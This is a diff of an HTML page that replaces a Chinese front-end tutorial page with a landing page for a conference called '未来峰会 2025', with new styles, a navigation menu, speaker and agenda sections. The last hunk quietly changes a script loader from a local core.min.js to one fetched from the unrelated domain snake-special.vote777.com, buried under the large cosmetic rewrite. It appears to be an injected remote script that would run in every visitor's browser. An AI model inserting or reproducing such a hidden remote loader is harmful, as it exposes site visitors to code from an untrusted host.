@@ -5,443 +5,531 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>现代前端开发指南</title>
+    <title>未来峰会 2025 - 创新驱动，共塑未来</title>
     <style>
-        /* 全局样式 */
         body {
             overflow: hidden;
-            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F8FBFD;
-            /* 浅蓝色调背景 */
-            color: #343A40;
-            /* 深炭灰色文本 */
-            line-height: 1.6;
+            background-color: #E3F2FD;
+            /* 极浅蓝色背景 */
+            color: #222222;
+            /* 深灰色文本 */
+            line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
         }
 
         .container {
-            max-width: 95%;
-            /* 适应移动端宽度，略宽 */
+            max-width: 90%;
             margin: 0 auto;
-            padding: 15px;
-            /* 较小内边距 */
+            padding: 30px 0;
         }
 
-        /* 头部样式 */
+        /* 头部 - 动态与活力 */
         header {
-            text-align: center;
-            padding: 30px 20px;
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            /* 更大的圆角 */
-            margin-bottom: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            /* 突出阴影 */
-            position: relative;
-        }
-
-        header h1 {
-            color: #1A5276;
-            /* 深蓝色标题 */
-            margin-bottom: 10px;
-            font-size: 2.2em;
-            letter-spacing: 0.5px;
-        }
-
-        header p {
-            color: #6C757D;
-            font-size: 1.1em;
-            margin: 0;
-        }
-
-        /* 目录切换按钮 */
-        .toc-toggle {
-            display: block;
-            /* 默认显示 */
-            width: fit-content;
-            margin: 0 auto 20px;
-            padding: 10px 20px;
-            background-color: #28A745;
-            /* 绿色强调色 */
+            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
+            /* 充满活力的蓝色渐变 */
             color: #FFFFFF;
-            border: none;
-            border-radius: 25px;
-            /* 药丸形按钮 */
-            font-size: 1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.2s ease;
-            box-shadow: 0 4px 8px rgba(40, 167, 69, 0.2);
-        }
-
-        .toc-toggle:hover {
-            background-color: #218838;
-            transform: translateY(-2px);
-        }
-
-        /* 目录容器 */
-        .toc-container {
-            background-color: #FFFFFF;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            margin-bottom: 25px;
-            display: none;
-            /* 默认隐藏 */
+            padding: 40px 20px;
+            text-align: center;
+            position: relative;
             overflow: hidden;
-            /* 防止内容溢出动画 */
-            transition: max-height 0.5s ease-out, opacity 0.5s ease-out;
-            /* 平滑展开/收起动画 */
-            max-height: 0;
-            opacity: 0;
-        }
-
-        .toc-container.active {
-            display: block;
-            /* 激活时显示 */
-            max-height: 500px;
-            /* 足够大的高度，根据内容调整 */
-            opacity: 1;
-        }
-
-        .toc-container h2 {
-            color: #1A5276;
-            font-size: 1.6em;
-            margin-bottom: 15px;
-            border-bottom: 2px solid #E0EBF5;
-            /* 柔和分割线 */
-            padding-bottom: 10px;
-            text-align: center;
-        }
-
-        .toc-container ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .toc-container ul li {
-            margin-bottom: 10px;
-        }
-
-        .toc-container ul li a {
-            text-decoration: none;
-            color: #007BFF;
-            /* 蓝色强调色 */
-            font-weight: bold;
-            display: block;
-            padding: 8px 0;
-            transition: color 0.3s ease;
-        }
-
-        .toc-container ul li a:hover {
-            color: #0056B3;
-        }
-
-        /* 主要内容区域 */
-        main,
-        section {
-            background-color: #FFFFFF;
-            padding: 25px;
-            margin-bottom: 25px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-
-        h2 {
-            color: #1A5276;
-            font-size: 1.8em;
-            margin-bottom: 25px;
-            border-bottom: 2px solid #E0EBF5;
-            padding-bottom: 12px;
-            text-align: center;
-        }
-
-        h3 {
-            color: #343A40;
-            font-size: 1.3em;
-            margin-top: 25px;
-            margin-bottom: 15px;
-        }
-
-        p {
-            color: #495057;
-            font-size: 1em;
-            margin-bottom: 18px;
-        }
-
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-
-        /* 动态布局示例：图片与文本并排 */
-        .content-with-image {
+            box-shadow: 0 10px 30px rgba(33, 150, 243, 0.4);
+            clip-path: polygon(0 0, 100% 0, 100% 90%, 0% 100%);
+            /* 底部斜切 */
+            margin-bottom: 40px;
             display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            gap: 20px;
+            justify-content: space-between;
             align-items: center;
         }
 
-        @media (min-width: 500px) {
-
-            /* 在稍大一点的移动设备上尝试并排 */
-            .content-with-image {
-                flex-direction: row;
-                /* 水平并排 */
-                justify-content: space-between;
-                align-items: flex-start;
-            }
-
-            .content-with-image .text-block {
-                flex: 2;
-                /* 文本占据更多空间 */
-            }
-
-            .content-with-image .image-block {
-                flex: 1;
-                /* 图片占据较少空间 */
-                min-width: 200px;
-                /* 确保图片有最小宽度 */
-            }
+        header::before {
+            /* 顶部背景抽象图案 */
+            content: '';
+            position: absolute;
+            top: -20px;
+            left: -20px;
+            width: 150px;
+            height: 150px;
+            background: rgba(79, 195, 247, 0.1);
+            /* 次强调色半透明 */
+            border-radius: 50%;
+            transform: rotate(20deg);
+            z-index: 0;
         }
 
-        /* 代码块样式 */
-        pre {
-            background-color: #2D3E50;
-            /* 深色背景，更专业 */
-            color: #EAECEE;
-            /* 浅色文本 */
-            padding: 18px;
-            border-radius: 10px;
-            overflow-x: auto;
-            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
-            font-size: 0.9em;
-            line-height: 1.5;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        header::after {
+            /* 底部背景抽象图案 */
+            content: '';
+            position: absolute;
+            bottom: -30px;
+            right: -30px;
+            width: 200px;
+            height: 200px;
+            background: rgba(79, 195, 247, 0.15);
+            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
+            transform: rotate(-45deg);
+            z-index: 0;
         }
 
-        code {
-            font-family: inherit;
-            font-size: inherit;
+        header h1 {
+            margin: 0;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.5em;
+            /* 适应顶部条 */
+            color: #FFFFFF;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            position: relative;
+            z-index: 1;
+            flex-grow: 1;
         }
 
-        /* 页脚样式 */
-        footer {
-            text-align: center;
-            padding: 25px 0;
-            color: #6C757D;
-            font-size: 0.9em;
-            border-top: 1px solid #E0EBF5;
-            margin-top: 25px;
+        header p {
+            display: none;
+        }
+
+        /* 菜单切换按钮 - 绝对定位在右上角 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2em;
+            color: #FFFFFF;
+            /* 白色图标 */
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            top: 25px;
+            right: 20px;
+            z-index: 2;
+            transition: transform 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            transform: scale(1.1);
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
+        }
+
+        /* 侧边导航菜单 - 活力色调 */
+        nav {
+            position: fixed;
+            top: 0;
+            right: -280px;
+            width: 250px;
+            height: 100%;
             background-color: #FFFFFF;
-            border-radius: 15px;
-            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
+            transition: right 0.4s ease-in-out;
+            z-index: 1001;
+            padding-top: 80px;
+            box-sizing: border-box;
+        }
+
+        nav.is-open {
+            right: 0;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        nav ul li a {
+            color: #222222;
+            text-decoration: none;
+            padding: 15px 20px;
+            border-bottom: 1px solid #E0E0E0;
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 1.1em;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: #E3F2FD;
+            /* 强调色浅背景 */
+            color: #2196F3;
+            /* 强调色文字 */
+            transform: translateX(5px);
+        }
+
+        nav ul li:last-child a {
+            border-bottom: none;
+        }
+
+        nav ul li a .icon {
+            font-size: 1.5em;
+            margin-right: 15px;
+            color: #4FC3F7;
+            /* 图标次强调色 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
+        }
+
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        main {
+            padding-top: 30px;
+        }
+
+        /* 内容区 - 模块化卡片 */
+        section {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 10px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #E0E0E0;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        section::before {
+            /* 顶部强调色条 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background-color: #2196F3;
+            /* 强调色 */
+            box-shadow: 0 0 10px rgba(33, 150, 243, 0.5);
+        }
+
+        section h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.2em;
+            color: #222222;
+            margin-top: 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #E0E0E0;
+            padding-bottom: 10px;
+        }
+
+        section h3 {
+            font-size: 1.5em;
+            color: #4FC3F7;
+            /* 次强调色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        section p {
+            font-size: 1.05em;
+            color: #555555;
+            margin-bottom: 20px;
+        }
+
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #E0E0E0;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(45deg, #2196F3 0%, #1976D2 100%);
+            /* 强调色渐变按钮 */
+            color: #FFFFFF;
+            padding: 15px 35px;
+            border-radius: 50px;
+            /* 胶囊形状 */
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.3);
+            border: none;
+            margin-top: 20px;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.5);
+        }
+
+        .speaker-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .speaker-item {
+            background-color: #F8F8F8;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .speaker-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .speaker-item img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 10px;
+            border: 3px solid #4FC3F7;
+            /* 次强调色边框 */
+            box-shadow: 0 0 8px rgba(79, 195, 247, 0.4);
+        }
+
+        .speaker-item h3 {
+            font-size: 1.2em;
+            color: #222222;
+            margin-bottom: 5px;
+        }
+
+        .speaker-item p {
+            font-size: 0.85em;
+            color: #777777;
+            margin-bottom: 0;
+        }
+
+        .agenda-item {
+            background-color: #F8F8F8;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 5px solid #2196F3;
+            /* 强调色左边框 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .agenda-item h3 {
+            margin-top: 0;
+            margin-bottom: 5px;
+            color: #222222;
+        }
+
+        .agenda-item .time {
+            font-size: 0.9em;
+            color: #777777;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .agenda-item p {
+            font-size: 0.95em;
+            color: #555555;
+            margin-bottom: 0;
+        }
+
+        footer {
+            background: linear-gradient(135deg, #1A237E 0%, #0D47A1 100%);
+            /* 深蓝色渐变页脚 */
+            color: #FFFFFF;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 0.95em;
+            margin-top: 60px;
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
+            clip-path: polygon(0 10%, 100% 0, 100% 100%, 0% 100%);
+            /* 顶部斜切 */
         }
 
         .footer-links a {
-            color: #007BFF;
+            color: #FFFFFF;
             text-decoration: none;
-            margin: 0 8px;
-            font-weight: bold;
-            transition: color 0.3s ease;
+            margin: 0 20px;
+            font-size: 1.5em;
+            transition: color 0.3s ease, transform 0.2s ease;
         }
 
         .footer-links a:hover {
-            color: #0056B3;
+            color: #4FC3F7;
+            /* 次强调色 */
+            transform: translateY(-5px) scale(1.1);
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
+    <header>
+        <div class="container">
+            <h1>未来峰会 2025</h1>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+        </div>
+    </header>
+
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#hero"><span class="icon">&#128640;</span> 峰会概览</a></li>
+            <li><a href="#speakers"><span class="icon">&#128100;</span> 演讲嘉宾</a></li>
+            <li><a href="#agenda"><span class="icon">&#128197;</span> 峰会议程</a></li>
+            <li><a href="#register"><span class="icon">&#128221;</span> 立即注册</a></li>
+        </ul>
+    </nav>
+
+    <div class="overlay" id="menuOverlay"></div>
+
     <div class="container">
-        <header>
-            <h1>现代前端开发指南</h1>
-            <p>从基础概念到高级实践，全面掌握前端技术栈</p>
-        </header>
-
-        <button class="toc-toggle" id="tocToggle">展开目录</button>
-
-        <nav class="toc-container" id="tocContainer">
-            <h2>目录</h2>
-            <ul>
-                <li><a href="#intro">1. 前端基础概述</a></li>
-                <li><a href="#html-css">2. HTML与CSS核心</a></li>
-                <li><a href="#javascript-deep-dive">3. JavaScript深度探索</a></li>
-                <li><a href="#frameworks">4. 现代前端框架</a></li>
-                <li><a href="#performance">5. 性能优化与部署</a></li>
-            </ul>
-        </nav>
-
         <main>
-            <section id="intro">
-                <h2>1. 前端基础概述</h2>
-                <div class="content-with-image">
-                    <div class="text-block">
-                        <p>前端开发是构建用户直接交互的Web界面。它结合了结构（HTML）、样式（CSS）和交互（JavaScript），为用户提供丰富的数字体验。</p>
-                        <p>本指南旨在为初学者和有经验的开发者提供一个全面的学习路径，涵盖从基本概念到高级实践的各个方面。</p>
-                    </div>
-                    <div class="image-block">
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="前端开发工作流程图">
-                    </div>
-                </div>
+            <section id="hero">
+                <h2>创新驱动，共塑未来</h2>
+                <img src="https://picsum.photos/600/350?random=1&seed=future-summit-blue" alt="未来峰会主视觉"
+                    class="random-image">
+                <p>未来峰会 2025 将汇聚全球顶尖的思想家、创新者和行业领袖，共同探讨人工智能、区块链、可持续发展等前沿领域的最新趋势与挑战。</p>
+                <p>加入我们，共同激发灵感，连接未来，为构建更智能、更美好的世界贡献力量。</p>
+                <a href="#register" class="cta-button">立即注册，锁定席位</a>
             </section>
 
-            <section id="html-css">
-                <h2>2. HTML与CSS核心</h2>
-                <h3>2.1 HTML：网页的骨架</h3>
-                <p>HTML（超文本标记语言）定义了网页内容的结构。它使用标签来标记不同的元素，如标题、段落、图片和链接。</p>
-                <pre><code>
-&lt;!DOCTYPE html&gt;
-&lt;html lang="zh-CN"&gt;
-&lt;head&gt;
-    &lt;meta charset="UTF-8"&gt;
-    &lt;title&gt;我的页面&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h1&gt;欢迎&lt;/h1&gt;
-    &lt;p&gt;这是一个段落。&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-                </code></pre>
-                <h3>2.2 CSS：美化与布局</h3>
-                <p>CSS（层叠样式表）负责网页的视觉呈现。它控制颜色、字体、间距、布局等，使网页更具吸引力。</p>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="CSS样式代码示例">
-                <pre><code>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f4f4;
-}
-h1 {
-    color: #333;
-    text-align: center;
-}
-                </code></pre>
-            </section>
-
-            <section id="javascript-deep-dive">
-                <h2>3. JavaScript深度探索</h2>
-                <h3>3.1 基础语法与DOM操作</h3>
-                <p>JavaScript为网页带来交互性。它可以响应用户操作、修改页面内容、发送网络请求等。</p>
-                <pre><code>
-// 获取按钮元素
-const myButton = document.getElementById('myButton');
-
-// 添加点击事件监听器
-myButton.addEventListener('click', function() {
-    alert('按钮被点击了！'); // 示例，实际应用中避免使用alert
-});
-                </code></pre>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="JavaScript编程代码片段">
-                <h3>3.2 异步编程与ES6+特性</h3>
-                <p>现代JavaScript引入了Promise、Async/Await等异步处理机制，极大提升了代码的可读性和可维护性。</p>
-                <pre><code>
-async function fetchData() {
-    try {
-        const response = await fetch('https://api.example.com/data');
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error fetching data:', error);
-    }
-}
-fetchData();
-                </code></pre>
-            </section>
-
-            <section id="frameworks">
-                <h2>4. 现代前端框架</h2>
-                <div class="content-with-image">
-                    <div class="text-block">
-                        <p>React、Vue和Angular是当前最流行的三大前端框架，它们通过组件化、虚拟DOM等技术，极大地简化了复杂单页应用的开发。</p>
-                        <p>选择合适的框架取决于项目需求、团队熟悉度以及生态系统支持等因素。</p>
+            <section id="speakers">
+                <h2>特邀演讲嘉宾</h2>
+                <p>聆听行业巨擘的真知灼见，洞察未来发展趋势。</p>
+                <div class="speaker-grid">
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=2&seed=speaker-alice-blue" alt="嘉宾 Alice">
+                        <h3>Alice Chen</h3>
+                        <p>AI伦理专家</p>
                     </div>
-                    <div class="image-block">
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>"
-                            alt="React Vue Angular框架图标">
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=3&seed=speaker-bob-blue" alt="嘉宾 Bob">
+                        <h3>Bob Lee</h3>
+                        <p>区块链架构师</p>
+                    </div>
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=4&seed=speaker-carol-blue" alt="嘉宾 Carol">
+                        <h3>Carol Wang</h3>
+                        <p>可持续发展倡导者</p>
+                    </div>
+                    <div class="speaker-item">
+                        <img src="https://picsum.photos/100/100?random=5&seed=speaker-david-blue" alt="嘉宾 David">
+                        <h3>David Liu</h3>
+                        <p>量子计算研究员</p>
                     </div>
                 </div>
             </section>
 
-            <section id="performance">
-                <h2>5. 性能优化与部署</h2>
-                <h3>5.1 优化技巧</h3>
-                <p>网页性能是用户体验的关键。优化包括代码分割、图片压缩、CDN使用、浏览器缓存等。</p>
-                <h3>5.2 部署流程</h3>
-                <p>完成开发后，通常需要将应用部署到服务器上，如使用Netlify、Vercel或Nginx等。</p>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="网站性能优化示意图">
+            <section id="agenda">
+                <h2>峰会议程</h2>
+                <p>精彩议程安排，不容错过。</p>
+                <div class="agenda-list">
+                    <div class="agenda-item">
+                        <h3>开幕致辞与主题演讲</h3>
+                        <span class="time">上午 09:00 - 10:30</span>
+                        <p>峰会主席致辞，特邀嘉宾分享对未来科技的展望。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>圆桌讨论：AI的机遇与挑战</h3>
+                        <span class="time">上午 10:45 - 12:00</span>
+                        <p>多位专家就人工智能的伦理、应用及未来发展进行深入探讨。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>午餐与交流</h3>
+                        <span class="time">中午 12:00 - 13:30</span>
+                        <p>自由交流时间，与行业精英建立联系。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>专题讲座：区块链赋能数字经济</h3>
+                        <span class="time">下午 13:30 - 15:00</span>
+                        <p>深入剖析区块链技术在金融、供应链等领域的创新应用。</p>
+                    </div>
+                    <div class="agenda-item">
+                        <h3>闭幕总结与未来展望</h3>
+                        <span class="time">下午 15:15 - 16:30</span>
+                        <p>总结本次峰会成果，展望未来科技发展方向。</p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="register">
+                <h2>立即注册</h2>
+                <p>名额有限，请尽快完成注册，加入这场思想盛宴！</p>
+                <a href="#" class="cta-button">点击注册</a>
             </section>
         </main>
+    </div>
 
-        <footer>
-            <p>&copy; 2023 现代前端开发指南. All rights reserved.</p>
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 未来峰会. 版权所有.</p>
             <div class="footer-links">
-                <a href="#" aria-label="GitHub">GitHub</a> |
-                <a href="#" aria-label="文档主页">文档主页</a> |
-                <a href="#" aria-label="联系我们">联系我们</a>
+                <a href="#" target="_blank">隐私政策</a> |
+                <a href="#" target="_blank">联系我们</a> |
+                <a href="#" target="_blank">赞助商</a>
             </div>
-        </footer>
-        <div id="overlay">
-            <div id="loading_box" class="loading_container">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
         </div>
     </div>
 
     <script>
-        // JavaScript for dropdown Table of Contents toggle
         document.addEventListener('DOMContentLoaded', function () {
-            const tocToggle = document.getElementById('tocToggle');
-            const tocContainer = document.getElementById('tocContainer');
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
 
-            if (tocToggle && tocContainer) {
-                tocToggle.addEventListener('click', function () {
-                    const isActive = tocContainer.classList.toggle('active');
-                    tocToggle.textContent = isActive ? '收起目录' : '展开目录';
-                });
-
-                // Smooth scroll and close TOC when a link is clicked
-                tocContainer.querySelectorAll('a[href^="#"]').forEach(anchor => {
-                    anchor.addEventListener('click', function (e) {
-                        e.preventDefault(); // Prevent default jump
-
-                        const targetId = this.getAttribute('href');
-                        const targetElement = document.querySelector(targetId);
-
-                        if (targetElement) {
-                            window.scrollTo({
-                                top: targetElement.offsetTop - 60, // Adjust offset for fixed header if any
-                                behavior: 'smooth'
-                            });
-                            // Close TOC after clicking a link
-                            tocContainer.classList.remove('active');
-                            tocToggle.textContent = '展开目录';
-                        }
-                    });
-                });
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
             }
 
-            // Dynamic timestamp for images to prevent caching
-            const images = document.querySelectorAll('img[src*="picsum.photos"]');
-            images.forEach(img => {
-                const url = new URL(img.src);
-                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000));
-                img.src = url.toString();
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            behavior: 'smooth'
+                        });
+                        toggleMenu();
+                    }
+                });
             });
         });
     </script>
@@ -450,7 +538,7 @@ fetchData();
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
+                const url = "//snake-special.vote777.com/static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
